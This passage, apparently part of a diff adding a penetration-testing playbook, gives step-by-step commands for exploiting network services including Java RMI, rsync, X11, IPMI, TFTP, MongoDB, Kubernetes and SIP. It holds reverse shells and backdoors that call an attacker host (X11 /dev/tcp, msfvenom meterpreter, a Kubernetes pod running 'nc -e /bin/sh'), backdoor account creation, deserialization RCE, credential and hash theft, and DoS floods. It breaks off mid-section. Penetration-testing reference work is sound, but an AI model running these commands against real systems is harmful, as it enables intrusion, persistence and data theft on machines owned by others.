+
+**Tools Required:**
+- nmap
+- rmg (RMI enumeration)
+- ysoserial
+- metasploit
+- BaRMIe
+
+**Steps/Commands:**
+```bash
+# RMI enumeration
+nmap -p 1099 --script rmi-dumpregistry <TARGET_IP>
+nmap -p 1099 --script rmi-vuln-classloader <TARGET_IP>
+
+# Using RMG tool
+rmg enum <TARGET_IP> 1099
+rmg guess <TARGET_IP> 1099
+rmg known <TARGET_IP> 1099
+
+# BaRMIe enumeration
+java -jar BaRMIe.jar -enum <TARGET_IP> 1099
+
+# List remote objects
+rmg objid <TARGET_IP> 1099
+
+# Method guessing
+rmg method <TARGET_IP> 1099 <CLASS_NAME> <METHOD_SIGNATURES>
+
+# Deserialization attack
+java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <TARGET_IP> 1099 CommonsCollections1 "<COMMAND>"
+
+# JMX exploitation (if exposed)
+java -jar jmxploit.jar --host <TARGET_IP> --port 1099 --attack deserialize --payload CommonsCollections1 --command "<COMMAND>"
+
+# Metasploit RMI scanner
+msfconsole -x "use auxiliary/scanner/misc/java_rmi_server; set RHOSTS <TARGET_IP>; run"
+
+# RMI class loading attack
+java -Djava.rmi.server.codebase=http://<ATTACKER_IP>/<CLASS_PATH> Exploit <TARGET_IP> 1099
+
+# Connect to RMI registry
+rmg call <TARGET_IP> 1099 'Registry.lookup' '["test"]'
+
+# CVE-2017-3241 (RMI registry bypass)
+java -jar exploit.jar <TARGET_IP> 1099 <PAYLOAD_TYPE> "<COMMAND>"
+```
+
+**Pitfalls:**
+- Deserialization filters
+- Security manager enabled
+- Firewall filtering
+- Class not found errors
+- JEP 290 protections (Java 9+)
+
+**Cleanup Steps:**
+```bash
+# No specific cleanup needed
+# Monitor for created processes/files
+```
+
+**Suggested Findings:**
+- RMI service exposed
+- Deserialization vulnerability
+- No security manager
+- Weak RMI configuration
+- Remote class loading enabled
+
+**Conditions When to Try:**
+- Java application present
+- Port 1099 open
+- Deserialization vector needed
+- Java-based infrastructure
+
+---
+
+## 23. rsync Service Exploitation (873/tcp)
+
+**Category:** File Transfer Services  
+**Description:** Exploit rsync service for unauthorized file access and data exfiltration.
+
+**Tools Required:**
+- rsync
+- nmap
+- nc/telnet
+- metasploit
+
+**Steps/Commands:**
+```bash
+# List available modules
+rsync -av --list-only rsync://<TARGET_IP>/
+nmap -p 873 --script rsync-list-modules <TARGET_IP>
+
+# List module contents
+rsync -av --list-only rsync://<TARGET_IP>/<MODULE_NAME>/
+
+# Download files/directories
+rsync -av rsync://<TARGET_IP>/<MODULE_NAME>/ ./loot/
+rsync -av rsync://<MODULE_NAME>@<TARGET_IP>/<PATH> ./loot/
+
+# Check for authentication
+rsync -av rsync://<USERNAME>@<TARGET_IP>/<MODULE_NAME>/
+
+# Banner grabbing
+nc -nv <TARGET_IP> 873
+echo -e "#list\n" | nc <TARGET_IP> 873
+
+# Upload files (if writable)
+rsync -av <LOCAL_FILE> rsync://<TARGET_IP>/<MODULE_NAME>/<PATH>
+
+# Brute force module names
+for module in $(cat <MODULE_WORDLIST>); do
+    rsync --list-only rsync://<TARGET_IP>/$module/ 2>/dev/null && echo "Found: $module"
+done
+
+# Check module configuration
+# Look for uid/gid settings, read only, hosts allow
+rsync -av --list-only rsync://<TARGET_IP>/<MODULE_NAME>/ -v
+
+# Metasploit enumeration
+msfconsole -x "use auxiliary/scanner/rsync/modules_list; set RHOSTS <TARGET_IP>; run"
+
+# Test write access
+echo "test" > test.txt
+rsync -av test.txt rsync://<TARGET_IP>/<MODULE_NAME>/test.txt
+
+# Mirror entire share
+rsync -av --progress rsync://<TARGET_IP>/<MODULE_NAME>/ ./mirror/
+```
+
+**Pitfalls:**
+- Authentication required
+- Read-only modules
+- IP-based restrictions
+- Chroot restrictions
+- Rate limiting
+
+**Cleanup Steps:**
+```bash
+# Remove uploaded test files
+rsync --delete-source test.txt rsync://<TARGET_IP>/<MODULE_NAME>/test.txt
+# Or delete manually
+rm ./loot/* ./mirror/*
+```
+
+**Suggested Findings:**
+- rsync exposed without auth
+- Writable rsync modules
+- Sensitive file exposure
+- No IP restrictions
+- Configuration files accessible
+
+**Conditions When to Try:**
+- Port 873 open
+- File transfer needed
+- Backup systems present
+- Data exfiltration goals
+
+---
+
+## 24. X11 Service Exploitation (6000-6063/tcp)
+
+**Category:** Display Services  
+**Description:** Exploit X11 display services for screenshot capture and keystroke injection.
+
+**Tools Required:**
+- xspy
+- xwd
+- xwininfo
+- xdpyinfo
+- metasploit
+
+**Steps/Commands:**
+```bash
+# Check X11 access control
+xdpyinfo -display <TARGET_IP>:0
+xwininfo -root -display <TARGET_IP>:0
+
+# List windows
+xwininfo -tree -root -display <TARGET_IP>:0
+
+# Take screenshot
+xwd -display <TARGET_IP>:0 -root -out screenshot.xwd
+convert screenshot.xwd screenshot.png
+
+# Capture keystrokes
+xspy <TARGET_IP>:0
+
+# Check authentication
+nmap -p 6000-6063 --script x11-access <TARGET_IP>
+
+# Test access
+DISPLAY=<TARGET_IP>:0 xterm
+DISPLAY=<TARGET_IP>:0 xclock
+
+# View live screen
+xwatchwin <TARGET_IP>:0 -w <WINDOW_ID>
+
+# Inject keystrokes
+DISPLAY=<TARGET_IP>:0 xdotool key <KEY_SEQUENCE>
+DISPLAY=<TARGET_IP>:0 xdotool type "malicious command"
+
+# Send mouse events
+DISPLAY=<TARGET_IP>:0 xdotool mousemove 100 100
+DISPLAY=<TARGET_IP>:0 xdotool click 1
+
+# Get clipboard
+DISPLAY=<TARGET_IP>:0 xclip -o
+
+# Metasploit module
+msfconsole -x "use auxiliary/scanner/x11/open_x11; set RHOSTS <TARGET_IP>; run"
+
+# Reverse shell via X11
+DISPLAY=<TARGET_IP>:0 xterm -e /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
+```
+
+**Pitfalls:**
+- X11 forwarding disabled
+- MIT-MAGIC-COOKIE auth
+- Xhost access control
+- SSH tunneling only
+- Modern systems use Wayland
+
+**Cleanup Steps:**
+```bash
+# Close opened windows
+DISPLAY=<TARGET_IP>:0 wmctrl -c <WINDOW_NAME>
+# Remove screenshot files
+rm screenshot.xwd screenshot.png
+```
+
+**Suggested Findings:**
+- X11 service exposed
+- No access control (xhost +)
+- Screen capture possible
+- Keystroke injection possible
+- Legacy X11 instead of Wayland
+
+**Conditions When to Try:**
+- Port 6000+ open
+- Unix/Linux systems
+- GUI interaction needed
+- Legacy systems present
+
+---
+
+## 25. IPMI Service Exploitation (623/udp)
+
+**Category:** Hardware Management  
+**Description:** Exploit Intelligent Platform Management Interface for system access and credential theft.
+
+**Tools Required:**
+- ipmitool
+- metasploit
+- hashcat
+- nmap
+
+**Steps/Commands:**
+```bash
+# IPMI enumeration
+nmap -sU -p 623 --script ipmi-version <TARGET_IP>
+nmap -sU -p 623 --script ipmi-cipher-zero <TARGET_IP>
+
+# Get IPMI version and info
+ipmitool -I lanplus -H <TARGET_IP> -U <USERNAME> -P <PASSWORD> mc info
+ipmitool -I lanplus -H <TARGET_IP> -U ADMIN -P ADMIN chassis status
+
+# Cipher 0 bypass (CVE-2013-4786)
+ipmitool -I lanplus -H <TARGET_IP> -U <USERNAME> -P <PASSWORD> -C 0 user list
+
+# Default credentials test
+# Common: ADMIN/ADMIN, root/calvin, admin/admin
+for user in ADMIN root admin; do
+    for pass in ADMIN calvin admin password; do
+        ipmitool -I lanplus -H <TARGET_IP> -U $user -P $pass chassis status
+    done
+done
+
+# Dump password hashes (requires valid user)
+msfconsole -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <TARGET_IP>; set USERNAME <USERNAME>; set PASSWORD <PASSWORD>; run"
+
+# RAKP hash extraction (offline cracking)
+msfconsole -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <TARGET_IP>; run"
+
+# Crack IPMI hashes
+hashcat -m 7300 <HASH_FILE> <WORDLIST>
+
+# User enumeration
+msfconsole -x "use auxiliary/scanner/ipmi/ipmi_enum; set RHOSTS <TARGET_IP>; run"
+
+# Add backdoor user (if admin access)
+ipmitool -I lanplus -H <TARGET_IP> -U <ADMIN_USER> -P <ADMIN_PASS> user set name 4 backdoor
+ipmitool -I lanplus -H <TARGET_IP> -U <ADMIN_USER> -P <ADMIN_PASS> user set password 4 <BACKDOOR_PASS>
+ipmitool -I lanplus -H <TARGET_IP> -U <ADMIN_USER> -P <ADMIN_PASS> user priv 4 4
+ipmitool -I lanplus -H <TARGET_IP> -U <ADMIN_USER> -P <ADMIN_PASS> user enable 4
+
+# Power control
+ipmitool -I lanplus -H <TARGET_IP> -U <USERNAME> -P <PASSWORD> power status
+ipmitool -I lanplus -H <TARGET_IP> -U <USERNAME> -P <PASSWORD> power cycle
+
+# Access console
+ipmitool -I lanplus -H <TARGET_IP> -U <USERNAME> -P <PASSWORD> sol activate
+```
+
+**Pitfalls:**
+- Network segmentation
+- Strong passwords
+- Account lockout
+- IPMI 2.0 security features
+- Firmware updates required
+
+**Cleanup Steps:**
+```bash
+# Remove backdoor user if created
+ipmitool -I lanplus -H <TARGET_IP> -U <ADMIN_USER> -P <ADMIN_PASS> user disable 4
+# Deactivate SOL session
+ipmitool -I lanplus -H <TARGET_IP> -U <USERNAME> -P <PASSWORD> sol deactivate
+```
+
+**Suggested Findings:**
+- IPMI exposed to network
+- Default IPMI credentials
+- Cipher 0 vulnerability
+- Weak IPMI passwords
+- No network segmentation for IPMI
+
+**Conditions When to Try:**
+- UDP 623 responsive
+- Server infrastructure
+- Out-of-band access needed
+- Hardware control required
+
+---
+
+## 26. MQTT Service Exploitation (1883/tcp, 8883/tcp)
+
+**Category:** IoT/Message Services  
+**Description:** Exploit MQTT message brokers for information disclosure and message injection.
+
+**Tools Required:**
+- mosquitto_sub/pub
+- nmap
+- mqtt-pwn
+- mqtt-explorer
+
+**Steps/Commands:**
+```bash
+# MQTT enumeration
+nmap -p 1883,8883 --script mqtt-subscribe <TARGET_IP>
+
+# Subscribe to all topics
+mosquitto_sub -h <TARGET_IP> -t '#' -v
+mosquitto_sub -h <TARGET_IP> -t '$SYS/#' -v
+
+# Common topic discovery
+mosquitto_sub -h <TARGET_IP> -t '+/+/+' -v
+mosquitto_sub -h <TARGET_IP> -t 'home/#' -v
+mosquitto_sub -h <TARGET_IP> -t 'device/#' -v
+
+# Check authentication
+mosquitto_sub -h <TARGET_IP> -t '#' -u <USERNAME> -P <PASSWORD> -v
+
+# Publish messages
+mosquitto_pub -h <TARGET_IP> -t '<TOPIC>' -m '<MESSAGE>'
+
+# Brute force topics
+for topic in $(cat <TOPIC_WORDLIST>); do
+    timeout 2 mosquitto_sub -h <TARGET_IP> -t "$topic" -C 1 2>/dev/null && echo "Found: $topic"
+done
+
+# System topics enumeration
+mosquitto_sub -h <TARGET_IP> -t '$SYS/broker/version' -C 1
+mosquitto_sub -h <TARGET_IP> -t '$SYS/broker/clients/connected' -C 1
+
+# TLS MQTT (8883)
+mosquitto_sub -h <TARGET_IP> -p 8883 --cafile <CA_CERT> -t '#' -v
+
+# Check for retained messages
+mosquitto_sub -h <TARGET_IP> -t '#' -v --retained-only
+
+# DoS via message flooding
+for i in {1..10000}; do
+    mosquitto_pub -h <TARGET_IP> -t 'test/flood' -m "message$i" &
+done
+
+# Will message exploitation
+mosquitto_sub -h <TARGET_IP> -t '#' --will-topic 'device/status' --will-payload 'offline' -v
+```
+
+**Pitfalls:**
+- Authentication required
+- TLS encryption
+- ACLs on topics
+- Rate limiting
+- Topic names unknown
+
+**Cleanup Steps:**
+```bash
+# Disconnect subscriptions
+killall mosquitto_sub
+# Clear published test messages (if retained)
+mosquitto_pub -h <TARGET_IP> -t '<TEST_TOPIC>' -n -r
+```
+
+**Suggested Findings:**
+- MQTT broker without authentication
+- Sensitive data in messages
+- Command injection via topics
+- No TLS encryption
+- Weak MQTT credentials
+
+**Conditions When to Try:**
+- IoT environment
+- Port 1883/8883 open
+- Message broker identified
+- Smart home/building systems
+
+---
+
+## 27. TFTP Service Exploitation (69/udp)
+
+**Category:** File Transfer Services  
+**Description:** Exploit Trivial File Transfer Protocol for unauthenticated file access.
+
+**Tools Required:**
+- tftp
+- atftp
+- nmap
+- metasploit
+
+**Steps/Commands:**
+```bash
+# TFTP enumeration
+nmap -sU -p 69 --script tftp-enum <TARGET_IP>
+
+# Connect to TFTP
+tftp <TARGET_IP>
+
+# Get file
+tftp> get <FILENAME>
+tftp> binary
+tftp> get <BINARY_FILE>
+
+# Put file (if writable)
+tftp> put <LOCAL_FILE>
+
+# Command line transfer
+tftp -g -r <REMOTE_FILE> <TARGET_IP>
+tftp -p -l <LOCAL_FILE> <TARGET_IP>
+
+# Brute force filenames
+for file in $(cat <FILE_WORDLIST>); do
+    echo "get $file" | tftp <TARGET_IP> 2>/dev/null && echo "Found: $file"
+done
+
+# Common files to check
+# Network device configs
+echo "get running-config" | tftp <TARGET_IP>
+echo "get startup-config" | tftp <TARGET_IP>
+echo "get network-confg" | tftp <TARGET_IP>
+
+# Windows files
+echo "get boot.ini" | tftp <TARGET_IP>
+echo "get sam" | tftp <TARGET_IP>
+
+# Using atftp
+atftp -g -r <REMOTE_FILE> <TARGET_IP>
+atftp -p -l <LOCAL_FILE> <TARGET_IP>
+
+# Directory traversal
+tftp <TARGET_IP>
+tftp> get ../../../etc/passwd
+tftp> get ..\..\..\windows\system32\config\sam
+
+# Metasploit scanner
+msfconsole -x "use auxiliary/scanner/tftp/tftpbrute; set RHOSTS <TARGET_IP>; run"
+
+# Upload backdoor (if writable)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe > backdoor.exe
+tftp -p -l backdoor.exe <TARGET_IP>
+```
+
+**Pitfalls:**
+- UDP packet loss
+- No directory listing
+- Filename guessing required
+- Size limitations
+- No authentication bypass
+
+**Cleanup Steps:**
+```bash
+# Remove uploaded files if possible
+tftp <TARGET_IP>
+tftp> delete <UPLOADED_FILE>
+# Note: delete rarely supported
+```
+
+**Suggested Findings:**
+- TFTP service exposed
+- Configuration file disclosure
+- Writable TFTP directory
+- No access controls
+- Directory traversal vulnerability
+
+**Conditions When to Try:**
+- UDP 69 responsive
+- Network devices present
+- Legacy systems
+- PXE boot environment
+
+---
+
+## 28. Cassandra Service Exploitation (9042/tcp, 9160/tcp)
+
+**Category:** NoSQL Database Services  
+**Description:** Exploit Apache Cassandra database for unauthorized data access.
+
+**Tools Required:**
+- cqlsh
+- cassandra-stress
+- nmap
+- metasploit
+
+**Steps/Commands:**
+```bash
+# Connect without authentication
+cqlsh <TARGET_IP> 9042
+
+# Basic enumeration
+cqlsh> DESCRIBE CLUSTER;
+cqlsh> DESCRIBE KEYSPACES;
+cqlsh> DESCRIBE TABLES;
+
+# List all keyspaces
+cqlsh> SELECT * FROM system_schema.keyspaces;
+
+# Enumerate tables
+cqlsh> USE <KEYSPACE_NAME>;
+cqlsh> DESCRIBE TABLES;
+
+# Query data
+cqlsh> SELECT * FROM <KEYSPACE>.<TABLE> LIMIT 10;
+
+# Check authentication
+cqlsh <TARGET_IP> -u <USERNAME> -p <PASSWORD>
+
+# Version information
+cqlsh> SHOW VERSION;
+cqlsh> SELECT release_version FROM system.local;
+
+# User enumeration
+cqlsh> LIST USERS;
+cqlsh> SELECT * FROM system_auth.users;
+
+# Check permissions
+cqlsh> LIST ALL PERMISSIONS OF <USERNAME>;
+
+# Create backdoor user (if admin)
+cqlsh> CREATE USER backdoor WITH PASSWORD '<PASSWORD>' SUPERUSER;
+
+# RCE via UDF (if permissions allow)
+cqlsh> CREATE OR REPLACE FUNCTION <KEYSPACE>.exec(cmd text)
+RETURNS text
+LANGUAGE java
+AS 'Runtime.getRuntime().exec(cmd); return cmd;';
+
+# Thrift API (9160/tcp)
+# Legacy API, try if 9042 fails
+cassandra-cli -h <TARGET_IP> -p 9160
+
+# Stress testing
+cassandra-stress write n=10000 -node <TARGET_IP>
+
+# Dump schema
+cqlsh <TARGET_IP> -e "DESCRIBE SCHEMA" > schema.cql
+
+# Export data
+cqlsh <TARGET_IP> -e "COPY <KEYSPACE>.<TABLE> TO 'data.csv'"
+```
+
+**Pitfalls:**
+- Authentication enabled
+- SSL/TLS required
+- Network filtering
+- Role-based access control
+- Audit logging
+
+**Cleanup Steps:**
+```bash
+# Drop backdoor user
+cqlsh> DROP USER backdoor;
+# Drop test functions
+cqlsh> DROP FUNCTION <KEYSPACE>.exec;
+```
+
+**Suggested Findings:**
+- Cassandra exposed without auth
+- Default credentials unchanged
+- Sensitive data exposure
+- UDF execution possible
+- No encryption enabled
+
+**Conditions When to Try:**
+- Port 9042/9160 open
+- NoSQL database present
+- Big data environment
+- Database access needed
+
+---
+
+## 29. RabbitMQ/AMQP Service Exploitation (5672/tcp, 15672/tcp)
+
+**Category:** Message Queue Services  
+**Description:** Exploit RabbitMQ message broker and management interface.
+
+**Tools Required:**
+- amqp-tools
+- rabbitmqctl
+- curl
+- nmap
+
+**Steps/Commands:**
+```bash
+# Management UI (15672/tcp)
+curl http://<TARGET_IP>:15672/api/overview
+# Default creds: guest/guest
+
+# Check management interface
+curl -u guest:guest http://<TARGET_IP>:15672/api/users
+curl -u guest:guest http://<TARGET_IP>:15672/api/queues
+curl -u guest:guest http://<TARGET_IP>:15672/api/exchanges
+
+# AMQP enumeration (5672/tcp)
+nmap -p 5672 --script amqp-info <TARGET_IP>
+
+# List queues via API
+curl -u <USERNAME>:<PASSWORD> http://<TARGET_IP>:15672/api/queues
+
+# Get messages from queue
+curl -u <USERNAME>:<PASSWORD> -X POST http://<TARGET_IP>:15672/api/queues/%2F/<QUEUE_NAME>/get -H "content-type:application/json" -d'{"count":10,"ackmode":"ack_requeue_false","encoding":"auto"}'
+
+# Create admin user via API
+curl -u <ADMIN>:<PASSWORD> -X PUT http://<TARGET_IP>:15672/api/users/<NEW_USER> -H "content-type:application/json" -d'{"password":"<NEW_PASS>","tags":"administrator"}'
+
+# Python exploitation
+python3
+import pika
+credentials = pika.PlainCredentials('<USERNAME>', '<PASSWORD>')
+connection = pika.BlockingConnection(
+    pika.ConnectionParameters('<TARGET_IP>', 5672, '/', credentials))
+channel = connection.channel()
+channel.queue_declare(queue='test')
+
+# Publish message
+channel.basic_publish(exchange='', routing_key='test', body='Test message')
+
+# Consume messages
+def callback(ch, method, properties, body):
+    print(f"Received: {body}")
+channel.basic_consume(queue='<QUEUE_NAME>', on_message_callback=callback, auto_ack=True)
+channel.start_consuming()
+
+# Check for Shovel plugin (lateral movement)
+curl -u <USERNAME>:<PASSWORD> http://<TARGET_IP>:15672/api/shovels
+
+# Federation links
+curl -u <USERNAME>:<PASSWORD> http://<TARGET_IP>:15672/api/federation-links
+```
+
+**Pitfalls:**
+- Non-default credentials
+- Management UI disabled
+- Network segregation
+- SSL/TLS required
+- LDAP authentication
+
+**Cleanup Steps:**
+```bash
+# Delete test queues
+curl -u <USERNAME>:<PASSWORD> -X DELETE http://<TARGET_IP>:15672/api/queues/%2F/<TEST_QUEUE>
+# Remove test users
+curl -u <USERNAME>:<PASSWORD> -X DELETE http://<TARGET_IP>:15672/api/users/<TEST_USER>
+```
+
+**Suggested Findings:**
+- Default RabbitMQ credentials
+- Management interface exposed
+- Sensitive data in messages
+- No encryption on AMQP
+- Administrative access possible
+
+**Conditions When to Try:**
+- Port 5672/15672 open
+- Message queue identified
+- Microservices architecture
+- Default creds common
+
+---
+
+## 30. Kubernetes API Exploitation (6443/tcp, 8080/tcp, 10250/tcp)
+
+**Category:** Container Orchestration  
+**Description:** Exploit Kubernetes API and kubelet for cluster compromise.
+
+**Tools Required:**
+- kubectl
+- curl
+- nmap
+- kubeletctl
+
+**Steps/Commands:**
+```bash
+# Check API server (6443/tcp or 8080/tcp)
+curl -k https://<TARGET_IP>:6443/version
+curl http://<TARGET_IP>:8080/version
+
+# Anonymous access check
+curl -k https://<TARGET_IP>:6443/api/v1/namespaces
+curl -k https://<TARGET_IP>:6443/api/v1/pods
+curl -k https://<TARGET_IP>:6443/api/v1/secrets
+
+# Get service account tokens
+curl -k https://<TARGET_IP>:6443/api/v1/namespaces/default/secrets
+
+# Kubelet API (10250/tcp)
+curl -k https://<TARGET_IP>:10250/pods
+curl -k https://<TARGET_IP>:10250/runningpods
+
+# Execute commands via kubelet
+curl -k -X POST https://<TARGET_IP>:10250/run/<NAMESPACE>/<POD_NAME>/<CONTAINER_NAME> -d "cmd=id"
+
+# Using kubeletctl
+kubeletctl pods -s <TARGET_IP>
+kubeletctl exec "id" -p <POD_NAME> -c <CONTAINER_NAME> -s <TARGET_IP>
+kubeletctl scan rce -s <TARGET_IP>
+
+# Get config if accessible
+curl -k https://<TARGET_IP>:6443/api/v1/namespaces/kube-system/configmaps
+
+# Port-forward to internal services
+kubectl --server=https://<TARGET_IP>:6443 --insecure-skip-tls-verify=true --token=<TOKEN> port-forward <POD_NAME> 8080:80
+
+# Create backdoor pod (if authorized)
+cat <<EOF | kubectl --server=https://<TARGET_IP>:6443 --token=<TOKEN> apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: backdoor
+spec:
+  containers:
+  - name: shell
+    image: alpine
+    command: ["/bin/sh"]
+    args: ["-c", "apk add --update nmap-ncat && nc -e /bin/sh <ATTACKER_IP> <PORT>"]
+EOF
+
+# Get secrets
+kubectl --server=https://<TARGET_IP>:6443 --token=<TOKEN> get secrets -A
+kubectl --server=https://<TARGET_IP>:6443 --token=<TOKEN> get secret <SECRET_NAME> -o yaml
+
+# Metrics server (various ports)
+curl http://<TARGET_IP>:10255/metrics  # Read-only kubelet
+curl http://<TARGET_IP>:9090/metrics   # Prometheus
+curl http://<TARGET_IP>:2379/version   # etcd
+
+# Check for dashboard
+curl -k https://<TARGET_IP>:8443/
+```
+
+**Pitfalls:**
+- RBAC properly configured
+- Network policies enforced
+- Pod security policies
+- Audit logging enabled
+- mTLS authentication
+
+**Cleanup Steps:**
+```bash
+# Delete backdoor pods
+kubectl --server=https://<TARGET_IP>:6443 --token=<TOKEN> delete pod backdoor
+# Remove test configmaps/secrets
+kubectl delete configmap <TEST_CONFIG>
+```
+
+**Suggested Findings:**
+- Kubernetes API exposed
+- Anonymous authentication allowed
+- Kubelet API accessible
+- Secrets in environment variables
+- No network policies
+
+**Conditions When to Try:**
+- Container orchestration present
+- Ports 6443/8080/10250 open
+- Cloud-native environment
+- Microservices architecture
+
+---
+
+## 31. NetBIOS Service Enumeration (137/udp, 138/udp, 139/tcp)
+
+**Category:** Windows Networking  
+**Description:** Enumerate NetBIOS services for Windows host information and shares.
+
+**Tools Required:**
+- nbtscan
+- nmblookup
+- enum4linux
+- nmap
+- smbclient
+
+**Steps/Commands:**
+```bash
+# NetBIOS name scanning
+nbtscan -r <IP_RANGE>
+nbtscan -v <TARGET_IP>
+
+# Enumerate NetBIOS names
+nmblookup -A <TARGET_IP>
+nmap -sU -p 137 --script nbstat <TARGET_IP>
+
+# Get NetBIOS name table
+nbtstat -A <TARGET_IP>  # Windows
+nbtstat -a <NETBIOS_NAME>  # Windows
+
+# Enumerate with enum4linux
+enum4linux -n <TARGET_IP>
+
+# Query specific NetBIOS names
+nmblookup -U <TARGET_IP> -R '<NETBIOS_NAME>'
+nmblookup -U <TARGET_IP> -R 'WORKGROUP'
+
+# NetBIOS session enumeration (139/tcp)
+smbclient -L \\\\<TARGET_IP> -N
+rpcclient -U "" -N <TARGET_IP>
+
+# Check node type
+# B-node (broadcast), P-node (WINS), M-node (mixed), H-node (hybrid)
+nbtscan -v -h <TARGET_IP>
+
+# NetBIOS datagram service (138/udp)
+# Used for browser service
+nmap -sU -p 138 --script broadcast-netbios-master-browser
+
+# Poison NetBIOS name resolution (like Responder)
+# Only in authorized tests!
+responder -I <INTERFACE> --lm
+
+# Query browser service
+net view /domain  # Windows
+smbclient -L <TARGET_IP> -N | grep -i master
+```
+
+**Pitfalls:**
+- Firewalls block NetBIOS
+- Modern systems disable it
+- Name resolution poisoning detected
+- WINS server configuration
+- IPv6 preferred over NetBIOS
+
+**Cleanup Steps:**
+```bash
+# No cleanup typically needed
+# Stop any poisoning tools
+killall responder nbns
+```
+
+**Suggested Findings:**
+- NetBIOS services enabled
+- NetBIOS name disclosure
+- Browser service running
+- Legacy protocols in use
+- Name resolution vulnerable
+
+**Conditions When to Try:**
+- Windows network
+- Legacy systems present
+- Broadcast domain access
+- Pre-enumeration phase
+
+---
+
+## 32. MongoDB Service Exploitation (27017/tcp, 28017/tcp)
+
+**Category:** NoSQL Database Services  
+**Description:** Exploit MongoDB instances for unauthorized database access.
+
+**Tools Required:**
+- mongo client
+- nmap
+- nosqlmap
+- metasploit
+
+**Steps/Commands:**
+```bash
+# Connect without authentication
+mongo --host <TARGET_IP> --port 27017
+
+# Basic enumeration
+mongo <TARGET_IP>:27017
+> show dbs
+> show collections
+> db.version()
+> db.hostInfo()
+
+# Admin database access
+> use admin
+> db.system.users.find()
+> db.system.version.find()
+
+# List all databases and collections
+> db.adminCommand({listDatabases: 1})
+> db.getCollectionNames()
+
+# Query data
+> use <DATABASE_NAME>
+> db.<COLLECTION>.find()
+> db.<COLLECTION>.find().pretty()
+
+# Check for authentication
+> db.runCommand({connectionStatus: 1})
+
+# Web interface (28017/tcp) - older versions
+curl http://<TARGET_IP>:28017/
+
+# Server status
+> db.serverStatus()
+> db.runCommand({serverStatus: 1})
+
+# Create admin user (if no auth)
+> use admin
+> db.createUser({
+    user: "backdoor",
+    pwd: "<PASSWORD>",
+    roles: [{role: "root", db: "admin"}]
+  })
+
+# NoSQL injection via REST API
+curl http://<TARGET_IP>:28017/<DB_NAME>/<COLLECTION>/?filter_<FIELD>=<VALUE>
+
+# Execute JavaScript
+> db.eval("return process.env")
+> db.eval("var x = cat('/etc/passwd'); return x;")
+
+# Dump entire database
+mongodump --host <TARGET_IP> --port 27017 --out dump/
+
+# Restore to local instance
+mongorestore --host localhost dump/
+
+# Check for GridFS files
+> use <DATABASE_NAME>
+> db.fs.files.find()
+> db.fs.chunks.find({files_id: ObjectId("<FILE_ID>")})
+
+# Metasploit scanner
+msfconsole -x "use auxiliary/scanner/mongodb/mongodb_login; set RHOSTS <TARGET_IP>; run"
+```
+
+**Pitfalls:**
+- Authentication enabled
+- Network binding to localhost
+- JavaScript execution disabled
+- Role-based access control
+- TLS/SSL required
+
+**Cleanup Steps:**
+```bash
+# Remove backdoor users
+> use admin
+> db.dropUser("backdoor")
+# Remove test databases
+> use testdb
+> db.dropDatabase()
+```
+
+**Suggested Findings:**
+- MongoDB exposed without auth
+- JavaScript execution enabled
+- Sensitive data in collections
+- No encryption enabled
+- Admin access possible
+
+**Conditions When to Try:**
+- Port 27017/28017 open
+- NoSQL database present
+- Web application backend
+- Database dumps needed
+
+---
+
+## 33. SIP/VoIP Service Exploitation (5060/tcp/udp, 5061/tcp)
+
+**Category:** Communication Services  
+**Description:** Exploit SIP services for VoIP enumeration and call manipulation.
+
+**Tools Required:**
+- sipvicious suite
+- nmap
+- sipp
+- metasploit
+
+**Steps/Commands:**
+```bash
+# SIP scanning
+svmap <TARGET_IP_RANGE>
+nmap -sU -p 5060 --script sip-enum-users <TARGET_IP>
+nmap -sU -p 5060 --script sip-methods <TARGET_IP>
+
+# Extension enumeration
+svwar -m INVITE -e 100-999 <TARGET_IP>
+svwar -m REGISTER -e 1000-9999 <TARGET_IP>
+
+# Password attacks
+svcrack -u <EXTENSION> -d <WORDLIST> <TARGET_IP>
+svcrack -u <EXTENSION> -r 1000-9999 <TARGET_IP>
+
+# SIP methods enumeration
+sipsak -v -s sip:<TARGET_IP> -M
+nmap -sU -p 5060 --script sip-methods <TARGET_IP>
+
+# Register attempts
+sipsak -U -s sip:<EXTENSION>@<TARGET_IP> -a <PASSWORD>
+
+# Make test call
+sipsak -s sip:<EXTENSION>@<TARGET_IP> -i
+
+# Enumerate users
+nmap -sU -p 5060 --script sip-enum-users --script-args 'sip-enum-users.users={100,101,102,200,300}'
+
+# Check for call forwarding
+sipsak -T -s sip:<EXTENSION>@<TARGET_IP>
+
+# RTP stream injection
+rtpinsertsound -s <SOURCE_IP> -d <DEST_IP> -f <AUDIO_FILE>
+
+# DTMF injection
+rtpbreak -t <TARGET_IP> -d 1234567890*#
+
+# TLS SIP (5061/tcp)
+openssl s_client -connect <TARGET_IP>:5061
+
+# Metasploit modules
+msfconsole -x "use auxiliary/scanner/sip/enumerator; set RHOSTS <TARGET_IP>; run"
+msfconsole -x "use auxiliary/voip/sip_invite_spoof; set RHOSTS <TARGET_IP>; run"
+
+# Denial of Service
+inviteflood <INTERFACE> <TARGET_USER> <TARGET_IP> <NUM_PACKETS>
+```
+
+**Pitfalls:**
+- Authentication required
+- Call rate limiting
+- SIP ALG interference
+- TLS encryption
+- Complex NAT scenarios
+
+**Cleanup Steps:**
+```bash
+# Stop any active calls/floods
+killall sipsak inviteflood rtpinsertsound
+# Deregister test extensions
+sipsak -U -s sip:<EXTENSION>@<TARGET_IP> -x 0
+```
+
+**Suggested Findings:**
+- SIP service exposed
+- Extension enumeration possible
+- Weak SIP credentials
+- No encryption on RTP
+- Call spoofing possible
+
+**Conditions When to Try:**
+- VoIP infrastructure present
+- Port 5060/5061 open
+- PBX systems identified
+- Voice security assessment
+
+---
+
+## 34. CouchDB Service Exploitation (5984/tcp)
+
+**Category:** NoSQL Database Services  
+**Description:** Exploit Apache CouchDB for unauthorized database access and potential RCE.
+
+**Tools Required:**
+- curl
+- couchdb-cli
+- nmap
+- metasploit
+
+**Steps/Commands:**
+```bash
+# Basic enumeration
+curl http://<TARGET_IP>:5984/
+curl http://<TARGET_IP>:5984/_all_dbs
+curl http://<TARGET_IP>:5984/_users/_all_docs
+
+# Version and config
+curl http://<TARGET_IP>:5984/_config
